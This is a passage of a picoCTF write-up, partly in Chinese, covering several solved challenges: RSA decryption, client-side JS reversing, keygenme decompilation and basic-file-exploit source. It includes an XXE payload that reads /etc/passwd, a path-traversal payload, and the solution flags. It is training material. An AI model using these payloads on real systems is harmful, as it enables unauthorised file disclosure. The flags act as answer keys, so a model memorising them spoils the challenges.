</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>205177004615238731351591289040361532005323127359264835947822740716983136768854567377695810379804519529001108024493036086993996665747898010286174708794831060625006137526368615944348139474971845237186225728575712792546002359378966044221352721991288514552994761886718307832529541998738515780841823857133357743562860987020334737036728017641876582542</span>
</span></span><span style=display:flex><span>n <span style=color:#f92672>=</span> <span style=color:#ae81ff>325639898609361998216675485356547029510334941438608718141166837901883899013721165219381706028192734268885029193084232593567285725019760847868933043664019031900580901169223676044511691181256188001312697240016796398130516789089663998776488278420247724141996094725183171258977283897111350310752334184134343620555307982038647996863698517917545473309</span>
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>65537</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>phi <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(p_q_factor)):
</span></span><span style=display:flex><span>    phi <span style=color:#f92672>=</span> (p_q_factor[i] <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> phi
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>d <span style=color:#f92672>=</span> inverse(e, phi)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(long_to_bytes(pow(c, d, n)))
</span></span></code></pre></div></li></ol><p>Flag: <code>b'picoCTF{too_many_fact0rs_8606199}'</code></p><hr><h2 id=challenge-soap>Challenge: SOAP🍰
<a class=anchor href=#challenge-soap>#</a></h2><h3 id=exploit---the-simplest-xxe>Exploit - The simplest XXE
<a class=anchor href=#exploit---the-simplest-xxe>#</a></h3><p>Payload:</p><pre tabindex=0><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;&lt;data&gt;&lt;ID&gt;&amp;xxe;&lt;/ID&gt;&lt;/data&gt;
</code></pre><hr><h2 id=challenge-picobrowser>Challenge: picobrowser🍰
<a class=anchor href=#challenge-picobrowser>#</a></h2><h3 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h3><p>才剛寫完<a href=https://hackmd.io/@SBK6401/B135SD0w2>Who are you?</a>就覺得案情不單純，只要把header User-Agent變成picobrowser就可以了</p><p>Flag: <code>picoCTF{p1c0_s3cr3t_ag3nt_84f9c865}</code></p><hr><h2 id=challenge-client-side-again>Challenge: Client-side-again🍰
<a class=anchor href=#challenge-client-side-again>#</a></h2><h3 id=exploit---reverse-script>Exploit - Reverse Script
<a class=anchor href=#exploit---reverse-script>#</a></h3><p>一開始先recon一下，我用burp抓了一下packet，發現他是把密碼在local端做驗證，所以要做的就只是要有耐心的分析一下source code
:::spoiler Source Code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>html</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>head</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>title</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>Secure</span> <span style=color:#a6e22e>Login</span> <span style=color:#a6e22e>Portal</span> <span style=color:#a6e22e>V2</span>.<span style=color:#ae81ff>0</span><span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/title&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/head&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>body</span> <span style=color:#a6e22e>background</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;barbed_wire.jpeg&#34;</span> <span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>&lt;!--</span> <span style=color:#a6e22e>standard</span> <span style=color:#a6e22e>MD5</span> <span style=color:#a6e22e>implementation</span> <span style=color:#f92672>--&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text/javascript&#34;</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;md5.js&#34;</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#960050;background-color:#1e0010>/script&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text/javascript&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>str_list</span><span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;f49bf}&#39;</span>,<span style=color:#e6db74>&#39;_again_e&#39;</span>,<span style=color:#e6db74>&#39;this&#39;</span>,<span style=color:#e6db74>&#39;Password\x20Verified&#39;</span>,<span style=color:#e6db74>&#39;Incorrect\x20password&#39;</span>,<span style=color:#e6db74>&#39;getElementById&#39;</span>,<span style=color:#e6db74>&#39;value&#39;</span>,<span style=color:#e6db74>&#39;substring&#39;</span>,<span style=color:#e6db74>&#39;picoCTF{&#39;</span>,<span style=color:#e6db74>&#39;not_this&#39;</span>];
</span></span><span style=display:flex><span>    (<span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>_0x4bd822</span>, <span style=color:#a6e22e>_0x2bd6f7</span>) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>_0xb4bdb3</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>_0x1d68f6</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>while</span> (<span style=color:#f92672>--</span><span style=color:#a6e22e>_0x1d68f6</span>) {
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>_0x4bd822</span>[<span style=color:#e6db74>&#39;push&#39;</span>](<span style=color:#a6e22e>_0x4bd822</span>[<span style=color:#e6db74>&#39;shift&#39;</span>]());
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        };
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>_0xb4bdb3</span>(<span style=color:#f92672>++</span><span style=color:#a6e22e>_0x2bd6f7</span>);
</span></span><span style=display:flex><span>    }(<span style=color:#a6e22e>str_list</span>, <span style=color:#ae81ff>435</span>));
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>_0x4b5b</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>var_1</span>) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>str_list</span>[<span style=color:#a6e22e>var_1</span>];
</span></span><span style=display:flex><span>    };
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>verify</span>() {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>checkpass</span> <span style=color:#f92672>=</span> document[<span style=color:#a6e22e>_0x4b5b</span>(<span style=color:#e6db74>&#39;0&#39;</span>)](<span style=color:#e6db74>&#39;pass&#39;</span>)[<span style=color:#a6e22e>_0x4b5b</span>(<span style=color:#e6db74>&#39;0x1&#39;</span>)];
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>checkpass</span>[<span style=color:#a6e22e>_0x4b5b</span>(<span style=color:#e6db74>&#39;0x2&#39;</span>)](<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>8</span>) <span style=color:#f92672>==</span> <span style=color:#a6e22e>_0x4b5b</span>(<span style=color:#e6db74>&#39;0x3&#39;</span>)) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>checkpass</span>[<span style=color:#a6e22e>_0x4b5b</span>(<span style=color:#e6db74>&#39;0x2&#39;</span>)](<span style=color:#ae81ff>7</span>, <span style=color:#ae81ff>9</span>) <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;{n&#39;</span>) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>checkpass</span>[<span style=color:#a6e22e>_0x4b5b</span>(<span style=color:#e6db74>&#39;0x2&#39;</span>)](<span style=color:#ae81ff>8</span>, <span style=color:#ae81ff>16</span>) <span style=color:#f92672>==</span> <span style=color:#a6e22e>_0x4b5b</span>(<span style=color:#e6db74>&#39;0x4&#39;</span>)) {
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>checkpass</span>[<span style=color:#a6e22e>_0x4b5b</span>(<span style=color:#e6db74>&#39;0x2&#39;</span>)](<span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>6</span>) <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;oCT&#39;</span>) {
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>checkpass</span>[<span style=color:#a6e22e>_0x4b5b</span>(<span style=color:#e6db74>&#39;0x2&#39;</span>)](<span style=color:#ae81ff>24</span>, <span style=color:#ae81ff>32</span>) <span style=color:#f92672>==</span> <span style=color:#a6e22e>_0x4b5b</span>(<span style=color:#e6db74>&#39;0x5&#39;</span>)) {
</span></span><span style=display:flex><span>                            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>checkpass</span>[<span style=color:#e6db74>&#39;substring&#39;</span>](<span style=color:#ae81ff>6</span>, <span style=color:#a6e22e>b</span>) <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;F{not&#39;</span>) {
</span></span><span style=display:flex><span>                                <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>checkpass</span>[<span style=color:#a6e22e>_0x4b5b</span>(<span style=color:#e6db74>&#39;0x2&#39;</span>)](<span style=color:#ae81ff>16</span>, <span style=color:#ae81ff>24</span>) <span style=color:#f92672>==</span> <span style=color:#a6e22e>_0x4b5b</span>(<span style=color:#e6db74>&#39;0x6&#39;</span>)) {
</span></span><span style=display:flex><span>                                    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>checkpass</span>[<span style=color:#a6e22e>_0x4b5b</span>(<span style=color:#e6db74>&#39;0x2&#39;</span>)](<span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>16</span>) <span style=color:#f92672>==</span> <span style=color:#a6e22e>_0x4b5b</span>(<span style=color:#e6db74>&#39;0x7&#39;</span>)) {
</span></span><span style=display:flex><span>                                        <span style=color:#a6e22e>alert</span>(<span style=color:#a6e22e>_0x4b5b</span>(<span style=color:#e6db74>&#39;0x8&#39;</span>));
</span></span><span style=display:flex><span>                                    }
</span></span><span style=display:flex><span>                                }
</span></span><span style=display:flex><span>                            }
</span></span><span style=display:flex><span>                        }
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>alert</span>(<span style=color:#a6e22e>_0x4b5b</span>(<span style=color:#e6db74>&#39;0x9&#39;</span>));
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/script&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>div</span> <span style=color:#a6e22e>style</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;position:relative; padding:5px;top:50px; left:38%; width:350px; height:140px; background-color:gray&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>div</span> <span style=color:#a6e22e>style</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text-align:center&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>p</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>New</span> <span style=color:#a6e22e>and</span> <span style=color:#a6e22e>Improved</span> <span style=color:#a6e22e>Login</span><span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/p&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>p</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>Enter</span> <span style=color:#a6e22e>valid</span> <span style=color:#a6e22e>credentials</span> <span style=color:#a6e22e>to</span> <span style=color:#a6e22e>proceed</span><span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/p&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>form</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;index.html&#34;</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;post&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;password&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;pass&#34;</span> <span style=color:#a6e22e>size</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;8&#34;</span> <span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span><span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;verify&#34;</span> <span style=color:#a6e22e>onclick</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;verify(); return false;&#34;</span> <span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/form&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/div&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/div&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/body&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/html&gt;</span>
</span></span></code></pre></div><p>:::</p><p>Flag: <code>picoCTF{not_this_again_ef49bf}</code></p><hr><h2 id=challenge-forbidden-paths>Challenge: Forbidden Paths🍰
<a class=anchor href=#challenge-forbidden-paths>#</a></h2><p>Description:</p><blockquote><p>We know that the website files live in /usr/share/nginx/html/ and the flag is at /flag.txt but the website is filtering absolute file paths. Can you get past the filter to read the flag?</p></blockquote><h3 id=exploit---easy-lfi>Exploit - Easy LFI
<a class=anchor href=#exploit---easy-lfi>#</a></h3><p><img src=https://hackmd.io/_uploads/HyYkIrJO2.png alt></p><p>Payload: <code>filename=../../../../flag.txt&amp;read=</code>
Flag: <code>picoCTF{7h3_p47h_70_5ucc355_e5a6fcbc}</code></p><hr><h2 id=challenge-keygenme>Challenge: keygenme🍰
<a class=anchor href=#challenge-keygenme>#</a></h2><h3 id=source>Source
<a class=anchor href=#source>#</a></h3><p>:::spoiler IDA Main Function</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>__int64</span> <span style=color:#66d9ef>__fastcall</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> a1, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>a2, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>a3)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> input_key[<span style=color:#ae81ff>40</span>]; <span style=color:#75715e>// [rsp+10h] [rbp-30h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> v5; <span style=color:#75715e>// [rsp+38h] [rbp-8h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  v5 <span style=color:#f92672>=</span> __readfsqword(<span style=color:#ae81ff>0x28u</span>);
</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;Enter your license key: &#34;</span>);
</span></span><span style=display:flex><span>  fgets(input_key, <span style=color:#ae81ff>37</span>, stdin);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( check_key(input_key) )
</span></span><span style=display:flex><span>    puts(<span style=color:#e6db74>&#34;That key is valid.&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    puts(<span style=color:#e6db74>&#34;That key is invalid.&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0LL</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>:::
:::spoiler IDA Check Flag Function</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>__int64</span> <span style=color:#66d9ef>__fastcall</span> <span style=color:#a6e22e>check_key</span>(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>input_key)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> v2; <span style=color:#75715e>// [rsp+18h] [rbp-C8h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> v3; <span style=color:#75715e>// [rsp+18h] [rbp-C8h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> i; <span style=color:#75715e>// [rsp+1Ch] [rbp-C4h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> j; <span style=color:#75715e>// [rsp+20h] [rbp-C0h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> k; <span style=color:#75715e>// [rsp+24h] [rbp-BCh]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> m; <span style=color:#75715e>// [rsp+28h] [rbp-B8h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> last_key[<span style=color:#ae81ff>34</span>]; <span style=color:#75715e>// [rsp+2Eh] [rbp-B2h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> key[<span style=color:#ae81ff>61</span>]; <span style=color:#75715e>// [rsp+50h] [rbp-90h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> v10; <span style=color:#75715e>// [rsp+8Dh] [rbp-53h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> v11[<span style=color:#ae81ff>72</span>]; <span style=color:#75715e>// [rsp+90h] [rbp-50h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> v12; <span style=color:#75715e>// [rsp+D8h] [rbp-8h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  v12 <span style=color:#f92672>=</span> __readfsqword(<span style=color:#ae81ff>0x28u</span>);
</span></span><span style=display:flex><span>  strcpy(key, <span style=color:#e6db74>&#34;picoCTF{br1ng_y0ur_0wn_k3y_&#34;</span>);
</span></span><span style=display:flex><span>  strcpy(last_key, <span style=color:#e6db74>&#34;}&#34;</span>);
</span></span><span style=display:flex><span>  strlen(key);
</span></span><span style=display:flex><span>  MD5();
</span></span><span style=display:flex><span>  strlen(last_key);
</span></span><span style=display:flex><span>  MD5();
</span></span><span style=display:flex><span>  v2 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> ( i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>15</span>; <span style=color:#f92672>++</span>i )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    sprintf(<span style=color:#f92672>&amp;</span>key[v2 <span style=color:#f92672>+</span> <span style=color:#ae81ff>32</span>], <span style=color:#e6db74>&#34;%02x&#34;</span>, last_key[i <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>]);
</span></span><span style=display:flex><span>    v2 <span style=color:#f92672>+=</span> <span style=color:#ae81ff>2</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  v3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> ( j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; j <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>15</span>; <span style=color:#f92672>++</span>j )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    sprintf(<span style=color:#f92672>&amp;</span>v11[v3], <span style=color:#e6db74>&#34;%02x&#34;</span>, last_key[j <span style=color:#f92672>+</span> <span style=color:#ae81ff>18</span>]);
</span></span><span style=display:flex><span>    v3 <span style=color:#f92672>+=</span> <span style=color:#ae81ff>2</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> ( k <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; k <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>26</span>; <span style=color:#f92672>++</span>k )
</span></span><span style=display:flex><span>    v11[k <span style=color:#f92672>+</span> <span style=color:#ae81ff>32</span>] <span style=color:#f92672>=</span> key[k];
</span></span><span style=display:flex><span>  v11[<span style=color:#ae81ff>59</span>] <span style=color:#f92672>=</span> key[<span style=color:#ae81ff>45</span>];
</span></span><span style=display:flex><span>  v11[<span style=color:#ae81ff>60</span>] <span style=color:#f92672>=</span> key[<span style=color:#ae81ff>50</span>];
</span></span><span style=display:flex><span>  v11[<span style=color:#ae81ff>61</span>] <span style=color:#f92672>=</span> v10;
</span></span><span style=display:flex><span>  v11[<span style=color:#ae81ff>62</span>] <span style=color:#f92672>=</span> key[<span style=color:#ae81ff>33</span>];
</span></span><span style=display:flex><span>  v11[<span style=color:#ae81ff>63</span>] <span style=color:#f92672>=</span> key[<span style=color:#ae81ff>46</span>];
</span></span><span style=display:flex><span>  v11[<span style=color:#ae81ff>64</span>] <span style=color:#f92672>=</span> key[<span style=color:#ae81ff>56</span>];
</span></span><span style=display:flex><span>  v11[<span style=color:#ae81ff>65</span>] <span style=color:#f92672>=</span> key[<span style=color:#ae81ff>58</span>];
</span></span><span style=display:flex><span>  v11[<span style=color:#ae81ff>66</span>] <span style=color:#f92672>=</span> v10;
</span></span><span style=display:flex><span>  v11[<span style=color:#ae81ff>67</span>] <span style=color:#f92672>=</span> last_key[<span style=color:#ae81ff>0</span>];
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( strlen(input_key) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>36</span> )
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0LL</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> ( m <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; m <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>35</span>; <span style=color:#f92672>++</span>m )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( input_key[m] <span style=color:#f92672>!=</span> v11[m <span style=color:#f92672>+</span> <span style=color:#ae81ff>32</span>] )
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0LL</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1LL</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>:::</p><h3 id=exploit-1>Exploit
<a class=anchor href=#exploit-1>#</a></h3><p>直接動態跑到最後看memory就會知道key是<code>picoCTF{br1ng_y0ur_0wn_k3y_19836cd8}</code>
<img src=https://hackmd.io/_uploads/SynfX-rtn.png alt></p><hr><h2 id=challenge-basic-file-exploit-1>Challenge: basic-file-exploit:-1:
<a class=anchor href=#challenge-basic-file-exploit-1>#</a></h2><h3 id=background>Background
<a class=anchor href=#background>#</a></h3><p><a href=https://www.runoob.com/cprogramming/c-function-strtol.html>strtol - c</a></p><h3 id=source-code-1>Source Code
<a class=anchor href=#source-code-1>#</a></h3><p>:::spoiler Source Code</p><pre tabindex=0><code class="language-cpp=" data-lang="cpp=">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdbool.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;ctype.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;sys/types.h&gt;


#define WAIT 60


static const char* flag = &#34;[REDACTED]&#34;;

static char data[10][100];
static int input_lengths[10];
static int inputs = 0;



int tgetinput(char *input, unsigned int l)
{
    fd_set          input_set;
    struct timeval  timeout;
    int             ready_for_reading = 0;
    int             read_bytes = 0;
    
    if( l &lt;= 0 )
    {
      printf(&#34;&#39;l&#39; for tgetinput must be greater than 0\n&#34;);
      return -2;
    }
    
    
    /* Empty the FD Set */
    FD_ZERO(&amp;input_set );
    /* Listen to the input descriptor */
    FD_SET(STDIN_FILENO, &amp;input_set);

    /* Waiting for some seconds */
    timeout.tv_sec = WAIT;    // WAIT seconds
    timeout.tv_usec = 0;    // 0 milliseconds

    /* Listening for input stream for any activity */
    ready_for_reading = select(1, &amp;input_set, NULL, NULL, &amp;timeout);
    /* Here, first parameter is number of FDs in the set, 
     * second is our FD set for reading,
     * third is the FD set in which any write activity needs to updated,
     * which is not required in this case. 
     * Fourth is timeout
     */

    if (ready_for_reading == -1) {
        /* Some error has occured in input */
        printf(&#34;Unable to read your input\n&#34;);
        return -1;
    } 

    if (ready_for_reading) {
        read_bytes = read(0, input, l-1);
        if(input[read_bytes-1]==&#39;\n&#39;){
        --read_bytes;
        input[read_bytes]=&#39;\0&#39;;
        }
        if(read_bytes==0){
            printf(&#34;No data given.\n&#34;);
            return -4;
        } else {
            return 0;
        }
    } else {
        printf(&#34;Timed out waiting for user input. Press Ctrl-C to disconnect\n&#34;);
        return -3;
    }

    return 0;
}


static void data_write() {
  char input[100];
  char len[4];
  long length;
  int r;
  
  printf(&#34;Please enter your data:\n&#34;);
  r = tgetinput(input, 100);
  // Timeout on user input
  if(r == -3)
  {
    printf(&#34;Goodbye!\n&#34;);
    exit(0);
  }
  
  while (true) {
    printf(&#34;Please enter the length of your data:\n&#34;);
    r = tgetinput(len, 4);
    // Timeout on user input
    if(r == -3)
    {
      printf(&#34;Goodbye!\n&#34;);
      exit(0);
    }
  
    if ((length = strtol(len, NULL, 10)) == 0) {
      puts(&#34;Please put in a valid length&#34;);
    } else {
      break;
    }
  }

  if (inputs &gt; 10) {
    inputs = 0;
  }

  strcpy(data[inputs], input);
  input_lengths[inputs] = length;

  printf(&#34;Your entry number is: %d\n&#34;, inputs + 1);
  inputs++;
}


static void data_read() {
  char entry[4];
  long entry_number;
  char output[100];
  int r;

  memset(output, &#39;\0&#39;, 100);
  
  printf(&#34;Please enter the entry number of your data:\n&#34;);
  r = tgetinput(entry, 4);
  // Timeout on user input
  if(r == -3)
  {
    printf(&#34;Goodbye!\n&#34;);
    exit(0);
  }
  
  if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
  }

  entry_number--;
  strncpy(output, data[entry_number], input_lengths[entry_number]);
  puts(output);
}


int main(int argc, char** argv) {
  char input[3] = {&#39;\0&#39;};
  long command;
  int r;

  puts(&#34;Hi, welcome to my echo chamber!&#34;);
  puts(&#34;Type &#39;1&#39; to enter a phrase into our database&#34;);
  puts(&#34;Type &#39;2&#39; to echo a phrase in our database&#34;);
  puts(&#34;Type &#39;3&#39; to exit the program&#34;);

  while (true) {   
    r = tgetinput(input, 3);
    // Timeout on user input
    if(r == -3)
    {
      printf(&#34;Goodbye!\n&#34;);
      exit(0);
    }
    
    if ((command = strtol(input, NULL, 10)) == 0) {
      puts(&#34;Please put in a valid number&#34;);
    } else if (command == 1) {
      data_write();
      puts(&#34;Write successful, would you like to do anything else?&#34;);
    } else if (command == 2) {
      if (inputs == 0) {
